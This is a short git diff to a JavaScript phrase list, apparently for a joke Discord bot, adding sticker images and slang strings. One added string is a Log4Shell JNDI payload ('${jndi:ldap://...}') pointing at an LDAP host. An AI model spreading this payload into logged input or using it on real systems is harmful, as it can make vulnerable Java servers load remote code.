@@ -21,7 +21,16 @@ const phrases = [
     createImage("https://media.discordapp.net/stickers/966761901780504597.png?size=160"),
     createImage("https://media.discordapp.net/stickers/960619462460076092.png?size=160"),
     createImage("https://media.discordapp.net/stickers/968699293370310666.png?size=160"),
-    createImage("https://media.discordapp.net/stickers/887267915102056460.png?size=160")
+    createImage("https://media.discordapp.net/stickers/887267915102056460.png?size=160"),
+    "banger",
+    "(autism diagnosis)",
+    "${jndi:ldap://192.168.1.1:6969/britmoji}",
+    "poggingfile:///home/britmoji/Pictures/Screenshot%20from%202021-04-11%2023-09-14.png",
+    "* moans *",
+    "calling all oomfies",
+    "@oomfies",
+    "hi oomfies",
+    createImage("https://media.discordapp.net/stickers/983690705727815731.webp?size=160")
 ];
 
 let dvd = {
